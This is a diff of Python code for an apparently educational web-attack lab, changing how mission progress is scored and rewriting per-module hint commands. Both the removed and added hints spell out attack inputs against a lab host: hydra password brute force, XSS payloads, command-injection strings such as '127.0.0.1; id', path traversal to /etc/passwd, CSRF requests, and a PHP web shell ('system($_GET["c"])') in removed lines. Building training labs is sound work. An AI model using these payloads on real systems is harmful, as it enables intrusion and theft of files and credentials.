@@ -75,7 +75,25 @@ def _is_operator_tool_event(e: Dict[str, Any]) -> bool:
 DERIVED_EVENT_TYPES = {"brute_force_pattern", "recon_sequence_observed"}
 
 
-def _event_counts_for_mode(e: Dict[str, Any], *, is_lab: bool) -> bool:
+# CSRF is the one module whose objective is genuinely browser-driven: the local
+# lure page (/op/evil/csrf-demo) auto-submits the state-changing request from the
+# ZAP-routed browser (via=browser), which is the whole point of a cross-site
+# forgery. For CSRF ONLY, via=browser is an approved completion channel — but
+# still tightly gated (operator route + backend=operator). This exception is NOT
+# generalized to any other module.
+BROWSER_COMPLETABLE_MODULES = {"csrf"}
+
+
+def _allowed_via_for(module_id: Optional[str]) -> set:
+    """Approved operator `via` channels for a module. Local attack tools always
+    count; CSRF additionally accepts the browser lure (see above)."""
+    if module_id in BROWSER_COMPLETABLE_MODULES:
+        return OPERATOR_TOOL_VIA | {"browser"}
+    return set(OPERATOR_TOOL_VIA)
+
+
+def _event_counts_for_mode(e: Dict[str, Any], *, is_lab: bool,
+                           module_id: Optional[str] = None) -> bool:
     """Generalized evidence gate shared by every module EXCEPT brute_force
     (which keeps its dedicated failure-count logic in
     ``_is_brute_force_event_for_mode``).  This is the same operator/guided
@@ -83,20 +101,20 @@ def _event_counts_for_mode(e: Dict[str, Any], *, is_lab: bool) -> bool:
     xss, cmd_injection, dir_traversal, file_upload and csrf.
 
     Lab / Operator mode — an event only counts toward mission progress when it
-    was produced by an approved local tool against the operator surface:
-      • via ∈ {attackbox, zap_repeater, zap_fuzzer}
+    was produced by an approved channel against the operator surface:
+      • via ∈ {attackbox, zap_repeater, zap_fuzzer}  (+ browser for CSRF only)
       • backend == "operator"
       • path starts with "/op/"  (derived events are exempt — they inherit
         backend/via but carry no /op/ path of their own)
-    Browser-only traffic (via=browser) and direct hits (via=unknown) stay
-    visible in the evidence panel but never complete the mission.
+    Direct hits (via=unknown) — and browser traffic for every module except
+    CSRF — stay visible in the evidence panel but never complete the mission.
 
     Tutorial / Guided mode — counts guided-surface evidence from any channel,
     but NOT operator-surface events, so the two modes never cross-complete.
     """
     backend = _event_backend(e)
     if is_lab:
-        if not _is_operator_tool_event(e):
+        if str(e.get("via") or "") not in _allowed_via_for(module_id):
             return False
         if backend != "operator":
             return False
@@ -105,6 +123,52 @@ def _event_counts_for_mode(e: Dict[str, Any], *, is_lab: bool) -> bool:
         return _event_path(e).startswith("/op/")
     # Tutorial/guided: exclude operator-surface events; any channel is fine.
     return backend != "operator"
+
+
+# Diagnostic reason buckets for events that were observed but NOT counted.
+IGNORED_REASONS = (
+    "ignored_wrong_path", "ignored_wrong_backend", "ignored_wrong_via",
+    "ignored_wrong_module", "ignored_variant_mismatch", "ignored_unknown_reason",
+)
+
+
+def _ignore_reason(e: Dict[str, Any], *, module_id: str, is_lab: bool,
+                   module_known_types: set) -> Optional[str]:
+    """Why an in-scope event did not count toward this module's progress.
+
+    Returns None when the event counted, or when it is entirely unrelated to
+    this module (out-of-scope noise is not reported as an ignore reason).
+    """
+    et = e.get("event_type")
+    in_scope = (et in module_known_types) or (e.get("module_id") == module_id)
+    if not in_scope:
+        return None
+
+    if module_id == "brute_force":
+        counted = _is_brute_force_event_for_mode(e, is_lab=is_lab)
+    else:
+        counted = _event_counts_for_mode(e, is_lab=is_lab, module_id=module_id)
+    if counted:
+        return None
+
+    backend = _event_backend(e)
+    via = str(e.get("via") or "")
+    path = _event_path(e)
+
+    if not is_lab:
+        # Tutorial/guided only excludes operator-surface events.
+        return "ignored_wrong_backend" if backend == "operator" else "ignored_unknown_reason"
+
+    # Lab-mode diagnostics, most-specific first.
+    if e.get("module_id") and e.get("module_id") != module_id and et not in module_known_types:
+        return "ignored_wrong_module"
+    if backend != "operator":
+        return "ignored_wrong_backend"
+    if et not in DERIVED_EVENT_TYPES and not path.startswith("/op/"):
+        return "ignored_wrong_path"
+    if via not in _allowed_via_for(module_id):
+        return "ignored_wrong_via"
+    return "ignored_unknown_reason"
 
 
 def _is_brute_force_event_for_mode(e: Dict[str, Any], *, is_lab: bool) -> bool:
@@ -533,14 +597,11 @@ MODULE_VARIANTS: Dict[str, Dict[str, Dict[str, Any]]] = {
             "success_event_types": ["brute_force_pattern", "credential_found"],
             "ideal_commands": [
                 "# ── Password spraying · ZAP Fuzzer (Lab Tools → ZAP → Fuzzer) ──",
-                "# Sniper attack: ONE common password, MANY usernames.",
-                "# 1. POSITIONS →  username=§&password=password123   (§ on the username)",
+                "# Sniper attack: ONE common password, MANY usernames — all on /op/auth/login.",
+                "# 1. POSITIONS →  username=§&password=<one common password>   (§ on the username)",
                 "# 2. PAYLOADS  →  preset 'Common usernames'  →  START ATTACK",
-                "# 3. RESULTS   →  sort by STATUS. The 302 row is the account that",
-                "#                 reuses this common password (here: admin).",
-                "# 4. CONFIRM   →  Repeater: username=admin&password=password123 → 302 /profile/.",
-                "# Optional terminal fallback (only if you prefer the CLI):",
-                "curl -i -X POST http://target-agent/auth/login -d 'username=admin&password=password123'",
+                "# 3. RESULTS   →  sort by STATUS. The 302 row is the account that reuses it.",
+                "# 4. CONFIRM   →  Repeater: resend that username/password → 302 /profile/.",
             ],
         },
         "credential_stuffing": {
@@ -567,23 +628,18 @@ MODULE_VARIANTS: Dict[str, Dict[str, Dict[str, Any]]] = {
             "success_event_types": ["brute_force_pattern", "credential_found"],
             "ideal_commands": [
                 "# ── Two-phase attack · ZAP Fuzzer — the PortSwigger method ──",
-                "#   (Lab Tools → ZAP → Fuzzer.  Attack type: Sniper.)",
+                "#   (Lab Tools → ZAP → Fuzzer.  Attack type: Sniper.  Route: /op/auth/login.)",
                 "#",
                 "# PHASE 1 — enumerate a valid USERNAME (Sniper on the username):",
-                "#   Click '① Enumerate username'   →  username=§&password=x",
-                "#   PAYLOADS: 'Common usernames'   →  START ATTACK",
-                "#   GREP-MATCH is auto-set to 'Incorrect password'. Every row is 401,",
-                "#   but valid users return that message (invalid users say 'Account",
-                "#   not found'). The ✓ rows in the MATCH column are real accounts → admin.",
+                "#   POSITIONS: username=§&password=x   →  PAYLOADS 'Common usernames'  →  START ATTACK",
+                "#   GREP-MATCH 'Incorrect password' flags valid users (invalid users say",
+                "#   'Account not found'). The ✓ rows in the MATCH column are real accounts.",
                 "#",
                 "# PHASE 2 — brute that user's PASSWORD (Sniper on the password):",
-                "#   Click '② Brute password'       →  username=admin&password=§",
-                "#   PAYLOADS: 'Leaked mini-list'   →  START ATTACK",
-                "#   Read the STATUS column: the 302 row is the password → password123.",
+                "#   POSITIONS: username=<valid user>&password=§  →  PAYLOADS 'Leaked mini-list'",
+                "#   Read the STATUS column: the 302 row is the working password.",
                 "#",
-                "# CONFIRM — Repeater: username=admin&password=password123 → 302 /profile/.",
-                "# Optional terminal fallback (only if you prefer the CLI):",
-                "curl -i -X POST http://target-agent/auth/login -d 'username=admin&password=password123'",
+                "# CONFIRM — Repeater: resend the winning username/password → 302 /profile/.",
             ],
         },
         "hydra_targeted": {
@@ -613,11 +669,9 @@ MODULE_VARIANTS: Dict[str, Dict[str, Dict[str, Any]]] = {
             "ideal_commands": [
                 "# Advanced track — real CLI tooling. For the GUI-only path, use the",
                 "# ZAP Fuzzer instead (Password Spraying / Credential Stuffing variants).",
-                "# Hydra form-template: path:body:failure-string",
-                "hydra -l admin -P /wordlists/rockyou-mini.txt target-agent http-post-form '/auth/login:username=^USER^&password=^PASS^:Incorrect password' -t 8 -f",
-                "# Verify the credential by hand",
-                "curl -i -X POST http://target-agent/auth/login \\",
-                "     -d 'username=admin&password=password123'   # → 302 /profile/",
+                "# Hydra form-template against the operator route: path:body:failure-string",
+                "hydra -l admin -P /wordlists/rockyou-mini.txt target-agent http-post-form '/op/auth/login:username=^USER^&password=^PASS^:Incorrect password' -t 8 -f",
+                "# Then confirm the reported credential in ZAP Repeater on /op/auth/login (→ 302 /profile/).",
             ],
         },
     },
@@ -642,9 +696,11 @@ MODULE_VARIANTS: Dict[str, Dict[str, Dict[str, Any]]] = {
             ],
             "success_event_types": ["xss_payload_observed", "reflected_input_detected"],
             "ideal_commands": [
-                "curl -s --data-urlencode 'q=<script>alert(1)</script>' -G \\",
-                "     http://target-agent/search | grep -oE '<script[^<]*</script>'",
-                "# Expected:  <script>alert(1)</script>  (verbatim = unescaped)",
+                "# Capture: submit a query in Operator Mode, then open ZAP Proxy History.",
+                "# Baseline (AttackBox-safe — no shell metacharacters):",
+                "curl -s -G --data-urlencode 'q=hello' http://target-agent/op/search",
+                "# ZAP Repeater: set q=<script>alert(1)</script> and resend on /op/search.",
+                "# Confirm: the tag is reflected verbatim (unescaped) in the response body.",
             ],
         },
         "alternate_context": {
@@ -665,10 +721,12 @@ MODULE_VARIANTS: Dict[str, Dict[str, Dict[str, Any]]] = {
             ],
             "success_event_types": ["xss_payload_observed", "reflected_input_detected"],
             "ideal_commands": [
-                "for payload in '<img src=x onerror=alert(1)>' '<svg onload=alert(1)>' '\"><script>alert(1)</script>'; do",
-                "  echo \"=== $payload ===\"",
-                "  curl -s -G --data-urlencode \"q=$payload\" http://target-agent/search | grep -oE '<(img|svg|script)[^>]*>'",
-                "done",
+                "# Baseline capture in ZAP Proxy History, then Send to Repeater.",
+                "curl -s -G --data-urlencode 'q=test' http://target-agent/op/search",
+                "# ZAP Fuzzer: mark the q value and try one payload per request, e.g.:",
+                "#   <img src=x onerror=alert(1)>",
+                "#   <svg onload=alert(1)>",
+                "# Compare responses: the variant reflected unescaped is the working context.",
             ],
         },
         "stored_attempt": {
@@ -691,14 +749,9 @@ MODULE_VARIANTS: Dict[str, Dict[str, Dict[str, Any]]] = {
             ],
             "success_event_types": ["xss_payload_observed", "reflected_input_detected"],
             "ideal_commands": [
-                "# 1. Login and save cookie",
-                "curl -c /tmp/c.txt -s -X POST http://target-agent/auth/login \\",
-                "     -d 'username=admin&password=password123' >/dev/null",
-                "# 2. Update profile email with a payload",
-                "curl -b /tmp/c.txt -s -X POST http://target-agent/profile/update \\",
-                "     --data-urlencode 'email=<script>alert(1)</script>@evil.lab'",
-                "# 3. Re-read profile — payload appears unescaped",
-                "curl -b /tmp/c.txt -s http://target-agent/profile/ | grep -oE '<script[^<]*</script>'",
+                "# 1. Authenticate on the operator surface (use the lab-provided credential).",
+                "# 2. ZAP Repeater: POST /op/profile/update with a script payload in the email field.",
+                "# 3. Re-request /op/profile/ in Repeater and confirm the payload persists unescaped.",
             ],
         },
     },
@@ -723,9 +776,10 @@ MODULE_VARIANTS: Dict[str, Dict[str, Dict[str, Any]]] = {
             ],
             "success_event_types": ["command_injection_detected"],
             "ideal_commands": [
-                "curl -s -G --data-urlencode 'host=127.0.0.1; id' \\",
-                "     http://target-agent/system/ping | grep -oE 'uid=[^ ]+'",
-                "# Expected:  uid=0(root)",
+                "# Baseline (AttackBox-safe — a clean host value, no separators):",
+                "curl -s -G --data-urlencode 'host=localhost' http://target-agent/op/system/ping",
+                "# ZAP Repeater: change host to  127.0.0.1; id  and resend on /op/system/ping.",
+                "# Confirm: command output such as uid= appears after the ping output.",
             ],
         },
         "pipe_redirect": {
@@ -746,8 +800,12 @@ MODULE_VARIANTS: Dict[str, Dict[str, Dict[str, Any]]] = {
             ],
             "success_event_types": ["command_injection_detected"],
             "ideal_commands": [
-                "curl -s -G --data-urlencode 'host=127.0.0.1|whoami' http://target-agent/system/ping",
-                "curl -s -G --data-urlencode 'host=127.0.0.1 && cat /etc/hostname' http://target-agent/system/ping",
+                "# Baseline (AttackBox-safe):",
+                "curl -s -G --data-urlencode 'host=localhost' http://target-agent/op/system/ping",
+                "# ZAP Fuzzer: mark the host value and test one separator per request, e.g.:",
+                "#   127.0.0.1|whoami",
+                "#   127.0.0.1 && cat /etc/hostname",
+                "# Compare responses to see which separator the backend accepts.",
             ],
         },
         "subshell": {
@@ -770,8 +828,10 @@ MODULE_VARIANTS: Dict[str, Dict[str, Dict[str, Any]]] = {
             ],
             "success_event_types": ["command_injection_detected"],
             "ideal_commands": [
-                "curl -s -G --data-urlencode 'host=$(id)' http://target-agent/system/ping | head -5",
-                "curl -s -G --data-urlencode 'host=`cat /etc/passwd | head -1`' http://target-agent/system/ping",
+                "# Baseline (AttackBox-safe):",
+                "curl -s -G --data-urlencode 'host=localhost' http://target-agent/op/system/ping",
+                "# ZAP Repeater: test a subshell payload in the host value, e.g.  127.0.0.1$(id)",
+                "# Confirm: the substituted command output appears in the response.",
             ],
         },
     },
@@ -796,7 +856,10 @@ MODULE_VARIANTS: Dict[str, Dict[str, Dict[str, Any]]] = {
             ],
             "success_event_types": ["sensitive_file_disclosed"],
             "ideal_commands": [
-                "curl -s 'http://target-agent/files/read?path=../../etc/passwd' | grep -E '^root:'",
+                "# Baseline (AttackBox-safe — a normal file):",
+                "curl -s http://target-agent/op/files/read",
+                "# ZAP Repeater: change path to  ../../etc/passwd  and resend on /op/files/read.",
+                "# Confirm: the response body contains a passwd-style 'root:' line.",
             ],
         },
         "encoded": {
@@ -817,8 +880,12 @@ MODULE_VARIANTS: Dict[str, Dict[str, Dict[str, Any]]] = {
             ],
             "success_event_types": ["sensitive_file_disclosed"],
             "ideal_commands": [
-                "curl -s 'http://target-agent/files/read?path=..%2F..%2Fetc%2Fpasswd' | head",
-                "curl -s 'http://target-agent/files/read?path=%252E%252E%252Fetc%252Fpasswd' | head",
+                "# Baseline (AttackBox-safe):",
+                "curl -s http://target-agent/op/files/read",
+                "# ZAP Fuzzer: mark the path value and test encoded traversal variants, e.g.:",
+                "#   ..%2F..%2Fetc%2Fpasswd",
+                "#   %252E%252E%252Fetc%252Fpasswd  (double-encoded)",
+                "# Confirm: a passwd-style file is disclosed in the response.",
             ],
         },
         "absolute": {
@@ -841,8 +908,11 @@ MODULE_VARIANTS: Dict[str, Dict[str, Dict[str, Any]]] = {
             ],
             "success_event_types": ["sensitive_file_disclosed"],
             "ideal_commands": [
-                "curl -s 'http://target-agent/files/read?path=/etc/passwd' | grep -E '^root:'",
-                "curl -s 'http://target-agent/files/read?path=/etc/hostname'",
+                "# Baseline (AttackBox-safe):",
+                "curl -s http://target-agent/op/files/read",
+                "# ZAP Repeater: set path to an absolute path such as /etc/passwd (no ../).",
+                "# The operator route strips '..' but still accepts absolute paths — that is the bypass.",
+                "# Confirm: the response body contains a passwd-style 'root:' line.",
             ],
         },
     },
@@ -867,9 +937,11 @@ MODULE_VARIANTS: Dict[str, Dict[str, Dict[str, Any]]] = {
             ],
             "success_event_types": ["unrestricted_upload_detected"],
             "ideal_commands": [
-                "echo 'hello' > /tmp/probe.txt && curl -F 'file=@/tmp/probe.txt' http://target-agent/files/upload",
-                "echo '<?php echo \"x\"; ?>' > /tmp/shell.php",
-                "curl -F 'file=@/tmp/shell.php' http://target-agent/files/upload",
+                "# Baseline (AttackBox-safe — upload a harmless local file):",
+                "curl -F 'file=@/etc/hostname' http://target-agent/op/files/upload",
+                "# ZAP Repeater: replay the multipart upload with a bypass extension the",
+                "# operator filter misses (e.g. .phtml / .svg / .html) — never a real web shell.",
+                "# Confirm: the server stores the file and returns a /static/uploads/ path.",
             ],
         },
         "mime_spoof": {
@@ -890,8 +962,11 @@ MODULE_VARIANTS: Dict[str, Dict[str, Dict[str, Any]]] = {
             ],
             "success_event_types": ["unrestricted_upload_detected"],
             "ideal_commands": [
-                "echo '<?php phpinfo(); ?>' > /tmp/shell.php",
-                "curl -F 'file=@/tmp/shell.php;type=image/png' http://target-agent/files/upload",
+                "# Baseline (AttackBox-safe):",
+                "curl -F 'file=@/etc/hostname' http://target-agent/op/files/upload",
+                "# ZAP Repeater: replay the upload but change the file part's Content-Type",
+                "# to image/png while keeping a bypass extension. Use a harmless proof file only.",
+                "# Confirm: the server accepts it despite the mismatched type.",
             ],
         },
         "polyglot": {
@@ -914,10 +989,10 @@ MODULE_VARIANTS: Dict[str, Dict[str, Dict[str, Any]]] = {
             ],
             "success_event_types": ["unrestricted_upload_detected"],
             "ideal_commands": [
-                "# Build a polyglot: JPEG header + PHP payload",
-                "printf '\\xff\\xd8\\xff\\xe0' > /tmp/poly.jpg.php",
-                "echo '<?php system($_GET[\"c\"]); ?>' >> /tmp/poly.jpg.php",
-                "curl -F 'file=@/tmp/poly.jpg.php;type=image/jpeg' http://target-agent/files/upload",
+                "# ZAP Repeater: replay the multipart upload with a harmless polyglot proof",
+                "# file — valid image magic bytes plus a benign marker, saved with a bypass",
+                "# extension such as .jpg.phtml. Do NOT use a real web shell.",
+                "# Confirm: both the content sniff and the extension check are bypassed.",
             ],
         },
     },
@@ -942,11 +1017,9 @@ MODULE_VARIANTS: Dict[str, Dict[str, Dict[str, Any]]] = {
             ],
             "success_event_types": ["profile_changed_without_csrf"],
             "ideal_commands": [
-                "curl -c /tmp/c.txt -s -X POST http://target-agent/auth/login \\",
-                "     -d 'username=admin&password=password123' >/dev/null",
-                "curl -b /tmp/c.txt -s -X POST http://target-agent/profile/update \\",
-                "     -d 'email=pwned@evil.lab' -o /dev/null -w 'HTTP %{http_code}\\n'",
-                "curl -b /tmp/c.txt -s http://target-agent/profile/ | grep -oE 'pwned@evil[^<]*'",
+                "# 1. Authenticate on the operator surface (use the lab-provided credential).",
+                "# 2. ZAP Repeater: POST /op/profile/update with a new email and NO CSRF token.",
+                "# 3. Re-request /op/profile/ in Repeater and confirm the email changed.",
             ],
         },
         "lure_page": {
@@ -967,12 +1040,9 @@ MODULE_VARIANTS: Dict[str, Dict[str, Dict[str, Any]]] = {
             ],
             "success_event_types": ["csrf_lure_submitted", "profile_changed_without_csrf"],
             "ideal_commands": [
-                "# Login as victim",
-                "curl -c /tmp/c.txt -s -X POST http://target-agent/auth/login -d 'username=admin&password=password123' >/dev/null",
-                "# Simulate clicking the lure (sends Referer: /evil/csrf-demo)",
-                "curl -b /tmp/c.txt -s -e 'http://target-agent/evil/csrf-demo' \\",
-                "     -X POST http://target-agent/profile/update \\",
-                "     -d 'email=hacked@evil.lab'",
+                "# 1. Authenticate on the operator surface as the victim.",
+                "# 2. In the ZAP-routed lab browser, open the local lure /op/evil/csrf-demo.",
+                "# 3. The lure auto-submits to /op/profile/update — confirm the email changed silently.",
             ],
         },
         "json_bypass": {
@@ -995,10 +1065,10 @@ MODULE_VARIANTS: Dict[str, Dict[str, Dict[str, Any]]] = {
             ],
             "success_event_types": ["profile_changed_without_csrf"],
             "ideal_commands": [
-                "curl -c /tmp/c.txt -s -X POST http://target-agent/auth/login -d 'username=admin&password=password123' >/dev/null",
-                "curl -b /tmp/c.txt -s -X POST http://target-agent/profile/update \\",
-                "     -H 'Content-Type: application/json' \\",
-                "     -d '{\"email\":\"pwned@evil.lab\"}'",
+                "# 1. Authenticate on the operator surface (use the lab-provided credential).",
+                "# 2. ZAP Repeater: POST /op/profile/update with Content-Type application/json",
+                "#    and a JSON body such as {\"email\":\"pwned@lab.local\"} — no CSRF token.",
+                "# 3. Re-request /op/profile/ and confirm the JSON body was accepted.",
             ],
         },
     },
@@ -1024,11 +1094,11 @@ MODULE_VARIANTS: Dict[str, Dict[str, Dict[str, Any]]] = {
             ],
             "success_event_types": ["recon_sequence_observed"],
             "ideal_commands": [
-                "curl -s http://target-agent/ | head -30",
-                "curl -s http://target-agent/auth/login >/dev/null",
-                "curl -s http://target-agent/search?q=test >/dev/null",
-                "curl -s http://target-agent/profile/ >/dev/null",
-                "curl -s http://target-agent/files/read?path=readme.txt >/dev/null",
+                "# Map the operator portal with AttackBox-safe single requests:",
+                "curl -s -i http://target-agent/op/",
+                "curl -s -i http://target-agent/op/search?q=test",
+                "curl -s -i http://target-agent/op/files/read?path=readme.txt",
+                "# Visit 4+ distinct /op/ areas to trip the recon-sequence detector.",
             ],
         },
         "wordlist": {
@@ -1050,11 +1120,10 @@ MODULE_VARIANTS: Dict[str, Dict[str, Dict[str, Any]]] = {
             ],
             "success_event_types": ["recon_sequence_observed"],
             "ideal_commands": [
-                "gobuster dir -u http://target-agent -w /usr/share/wordlists/dirb/common.txt -t 20 -q",
-                "# Then GET each discovered path",
-                "for p in /search /system/ping /files/read /profile/ /evil/csrf-demo; do",
-                "  curl -s -o /dev/null -w '%{http_code} '$p'\\n' http://target-agent$p",
-                "done",
+                "# Content discovery against the operator surface (single, safe invocations):",
+                "gobuster dir -u http://target-agent/op/ -w /usr/share/wordlists/dirb/common.txt -t 20 -q",
+                "ffuf -w /wordlists/routes.txt -u http://target-agent/op/FUZZ",
+                "# Then request each discovered /op/ path in ZAP Repeater to verify it.",
             ],
         },
         "comment_hunting": {
@@ -1078,9 +1147,10 @@ MODULE_VARIANTS: Dict[str, Dict[str, Dict[str, Any]]] = {
             ],
             "success_event_types": ["recon_sequence_observed"],
             "ideal_commands": [
-                "curl -s http://target-agent/ | grep -E '<!--|Server|Framework|version' -i",
-                "curl -s http://target-agent/ | grep -oE 'href=\"[^\"]+\"' | sort -u",
-                "curl -sI http://target-agent/ | grep -i 'server\\|x-'",
+                "# Fetch the operator home and read the raw HTML source in ZAP Inspector:",
+                "curl -s -i http://target-agent/op/",
+                "# Look in the response for HTML comments, Server/version banners, and href targets.",
+                "# Follow any leaked path (e.g. /op/.git/config) and verify it in ZAP Repeater.",
             ],
         },
     },
@@ -2191,6 +2261,36 @@ OBJECTIVE_SPECS: Dict[str, Dict[str, Any]] = {
 }
 
 
+# Explicit operator surfaces per module (the /op/ paths that can carry
+# completion/quality evidence). Used to enrich each spec with the operator-
+# contract metadata the API and docs reference.
+_MODULE_OP_PATHS: Dict[str, List[str]] = {
+    "recon":         ["/op/", "/op/.git/config"],
+    "xss":           ["/op/search"],
+    "cmd_injection": ["/op/system/ping"],
+    "dir_traversal": ["/op/files/read"],
+    "file_upload":   ["/op/files/upload"],
+    "csrf":          ["/op/profile/update", "/op/evil/csrf-demo", "/op/profile/"],
+    "brute_force":   ["/op/auth/login"],
+}
+
+# Normalize each spec with the explicit operator-contract metadata, derived from
+# the working structures above so there is a single source of truth. This gives
+# every module: objective, required_completion, quality_events,
+# expected_operator_paths, expected_backend, allowed_operator_via,
+# next_recommended_action.
+for _mid, _spec in OBJECTIVE_SPECS.items():
+    _spec.setdefault("required_completion", _spec.get("completion_groups", []))
+    _spec.setdefault("quality_events", [qt["id"] for qt in _spec.get("quality_tasks", [])])
+    _spec.setdefault("expected_operator_paths", _MODULE_OP_PATHS.get(_mid, ["/op/"]))
+    _spec.setdefault("expected_backend", "operator")
+    _spec.setdefault("allowed_operator_via", sorted(_allowed_via_for(_mid)))
+    _spec.setdefault(
+        "next_recommended_action",
+        (_spec.get("quality_tasks") or [{}])[0].get("recommendation"),
+    )
+
+
 def get_objective_spec(module_id: str) -> Dict[str, Any]:
     """Return the objective spec for a module (empty dict if none)."""
     return OBJECTIVE_SPECS.get(module_id, {})
@@ -2335,7 +2435,7 @@ def compute(module_id: str,
         # count toward task completion.
         events_for_progress = [
             e for e in raw_events
-            if _event_counts_for_mode(e, is_lab=is_lab)
+            if _event_counts_for_mode(e, is_lab=is_lab, module_id=module_id)
         ]
 
     # Teaching content (TryHackMe-style) for this (module, variant), if any.
@@ -2412,7 +2512,7 @@ def compute(module_id: str,
             "counts":      (
                 _is_brute_force_event_for_mode(e, is_lab=is_lab)
                 if module_id == "brute_force"
-                else _event_counts_for_mode(e, is_lab=is_lab)
+                else _event_counts_for_mode(e, is_lab=is_lab, module_id=module_id)
             ),
             "extra":       e.get("extra", {}),
         })
@@ -2487,6 +2587,42 @@ def compute(module_id: str,
     module_events = [e for e in raw_events if e.get("event_type") in module_known_types]
     quality = _quality_report(module_id, module_events)
 
+    # ── Ignored-event diagnostics ────────────────────────────────────────────
+    # Explain, per event, why in-scope evidence did NOT count. This makes the
+    # strict operator gate transparent to students and instructors.
+    def _counted(ev: Dict[str, Any]) -> bool:
+        return (
+            _is_brute_force_event_for_mode(ev, is_lab=is_lab)
+            if module_id == "brute_force"
+            else _event_counts_for_mode(ev, is_lab=is_lab, module_id=module_id)
+        )
+
+    def _brief(ev: Dict[str, Any]) -> Dict[str, Any]:
+        return {
+            "event_type": ev.get("event_type"),
+            "path":       _event_path(ev),
+            "backend":    _event_backend(ev) or None,
+            "via":        ev.get("via", "unknown"),
+            "ts":         ev.get("ts"),
+        }
+
+    ignored_reasons: Dict[str, int] = {r: 0 for r in IGNORED_REASONS}
+    ignored_total = 0
+    for e in module_events:
+        if _counted(e):
+            continue
+        reason = _ignore_reason(
+            e, module_id=module_id, is_lab=is_lab, module_known_types=module_known_types
+        )
+        if reason:
+            ignored_reasons[reason] += 1
+            ignored_total += 1
+    counted_events = [e for e in events_for_progress]
+    last_observed_events = [_brief(e) for e in sorted(
+        module_events, key=lambda x: x.get("ts") or 0, reverse=True)[:8]]
+    last_counted_events = [_brief(e) for e in sorted(
+        counted_events, key=lambda x: x.get("ts") or 0, reverse=True)[:8]]
+
     # ── Safety / channel warnings (non-blocking) ─────────────────────────────
     warnings: List[str] = []
     if is_lab:
@@ -2545,6 +2681,49 @@ def compute(module_id: str,
         else:
             msg = "Start the mission and interact with the target environment."
 
+    # ── Typed tasks (backward-compatible) ────────────────────────────────────
+    # Augment the existing learning ladder with id/label/done/type/reason so the
+    # UI can distinguish required-objective vs recommended-quality vs optional
+    # learning steps without breaking consumers that read title/complete.
+    import re as _re
+    objective_types = {t for g in OBJECTIVE_SPECS.get(module_id, {}).get("completion_groups", []) for t in g}
+    for t in tasks_out:
+        ets = set(t.get("event_types", []))
+        if ets & objective_types:
+            ttype = "required"
+        elif ets & quality_event_types:
+            ttype = "quality"
+        else:
+            ttype = "optional"
+        t["id"] = _re.sub(r"[^a-z0-9]+", "_", (t.get("title") or "task").lower()).strip("_")
+        t["label"] = t.get("title")
+        t["done"] = bool(t.get("complete"))
+        t["type"] = ttype
+        t["reason"] = None if t.get("complete") else (
+            f"Needs {t.get('min_count', 1)} matching event(s); observed {t.get('match_count', 0)}."
+        )
+
+    # A compact, explicitly-typed view: the single required objective task plus
+    # the recommended quality tasks. `success` follows the required task; the
+    # quality tasks feed `quality_score`.
+    _completed_q_ids = {q["id"] for q in quality["completed"]}
+    objective_tasks: List[Dict[str, Any]] = [{
+        "id":     "objective",
+        "label":  OBJECTIVE_SPECS.get(module_id, {}).get("objective") or "Reach the attack objective",
+        "done":   success,
+        "type":   "required",
+        "reason": None if success else (next_action or "Objective not reached yet."),
+    }]
+    for qt in OBJECTIVE_SPECS.get(module_id, {}).get("quality_tasks", []):
+        done_q = qt["id"] in _completed_q_ids
+        objective_tasks.append({
+            "id":     qt["id"],
+            "label":  qt["label"],
+            "done":   done_q,
+            "type":   "quality",
+            "reason": None if done_q else qt.get("recommendation"),
+        })
+
     return {
         "module_id":           module_id,
         "mode":                mode,
@@ -2574,6 +2753,17 @@ def compute(module_id: str,
         "missing_quality":       quality["missing"],
         "warnings":              warnings,
         "next_recommended_action": next_action,
+        "objective_tasks":       objective_tasks,
+
+        # ── Operator-gate diagnostics ───────────────────────────────────────
+        # Transparency into the strict Operator gate: how many events were seen,
+        # how many counted, and why the rest were ignored.
+        "raw_event_count":       len(raw_events),
+        "counted_event_count":   len(events_for_progress),
+        "ignored_event_count":   ignored_total,
+        "ignored_reasons":       ignored_reasons,
+        "last_observed_events":  last_observed_events,
+        "last_counted_events":   last_counted_events,
     }
 
 
